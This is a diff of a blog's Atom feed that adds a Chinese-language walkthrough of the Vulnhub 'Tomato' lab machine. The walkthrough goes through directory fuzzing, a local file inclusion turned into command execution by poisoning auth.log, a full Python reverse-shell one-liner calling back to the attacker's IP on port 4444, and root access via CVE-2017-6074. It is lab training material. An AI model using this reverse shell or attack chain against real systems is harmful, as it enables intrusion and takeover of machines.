@@ -6,7 +6,7 @@
   <link href="https://pyhsecurity.cn/atom.xml" rel="self"/>
   
   <link href="https://pyhsecurity.cn/"/>
-  <updated>2021-12-24T05:56:06.334Z</updated>
+  <updated>2021-12-24T12:36:27.855Z</updated>
   <id>https://pyhsecurity.cn/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Tomato</title>
+    <link href="https://pyhsecurity.cn/2021/12/24/Tomato/"/>
+    <id>https://pyhsecurity.cn/2021/12/24/Tomato/</id>
+    <published>2021-12-24T12:35:20.000Z</published>
+    <updated>2021-12-24T12:36:27.855Z</updated>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;运行我们的bash脚本，发现目标系统开放了ftp和web服务&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/b2f1b07f20b74e8cbbf09d8aceb93286.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;我们尝试是否可以匿名登录ftp，未果&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/074a7cd93bf64ed3aa33a1e7ba57281e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;我们访问web服务，发现是一个番茄图片，查看源码也没什么发现&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/6fbb54145b634516a076f26d15d098ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;我们fuzz一下路径，发现了存在一个antibot_image路径&lt;/p&gt;
+&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;dirsearch -u &lt;span class=&quot;string&quot;&gt;&amp;quot;http://192.168.101.197/&amp;quot;&lt;/span&gt; -e * -x404,500,403 -w /usr/share/seclists/Discovery/Web-Content/common.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/fa0487042a3d48909ab79d96a12532a8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;我们发现存在一个info.php文件&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/a59aa7bf23b2400cb4fd41b01cea33d7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;文件的源码提示我们存在文件包含漏洞&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/39d170ef77ee482988bbfd4d37ecc20b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;我们验证漏洞确实是真实存在的&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/b6bee6c21fc2499999963c8682e6f3cf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;漏洞利用&quot;&gt;&lt;a href=&quot;#漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;漏洞利用&quot;&gt;&lt;/a&gt;漏洞利用&lt;/h2&gt;&lt;p&gt;我们尝试将一句话写进日志文件中，日志文件的路径为&lt;code&gt;/var/log/auth.log&lt;/code&gt;，发现已被写入日志并成功执行我们的命令&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/8fc98d199a4845c1a5e8d72245c7b934.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/bf1f3a8f67a6457998b22f5bd225ccc2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;那么我们就可以查找python是否存在，若存在则可以反弹shell到我们本地的机子上。可以看到python是存在的，并且版本为3.5&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/4d606cef990543d381d880d6a94f170c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;我们将执行如下的payload添加到cmd参数后获得一个shell&lt;/p&gt;
+&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;python3 -c &lt;span class=&quot;string&quot;&gt;&amp;#x27;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;192.168.101.196&amp;quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/bash&amp;quot;,&amp;quot;-i&amp;quot;])&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/8ac1207e853b4bfa8655671b22b4939d.png&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;提权&quot;&gt;&lt;a href=&quot;#提权&quot; class=&quot;headerlink&quot; title=&quot;提权&quot;&gt;&lt;/a&gt;提权&lt;/h2&gt;&lt;p&gt;我们将linpeas.sh脚本上传到靶机上，并执行它&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/23a8477f887a40c3b6df7f1df69d406b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;发现存在一个linux内核漏洞&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/e962cb6858c242bea4f04c0d8d28b3b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;我们发现这个内核漏洞对应的漏洞编号为&lt;code&gt;CVE-2017-6074&lt;/code&gt;，我们将其编译变上传到靶机上，执行即root&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/8d5db74c976140df8fd5b0d408768a02.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;br&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/335e4f13aa7e4d8c9ebaf95cb4c8749c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="文件包含漏洞" scheme="https://pyhsecurity.cn/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
+    
+    
+    <category term="Vulnhub" scheme="https://pyhsecurity.cn/tags/Vulnhub/"/>
+    
+  </entry>
   
   <entry>
     <title>Sauna</title>
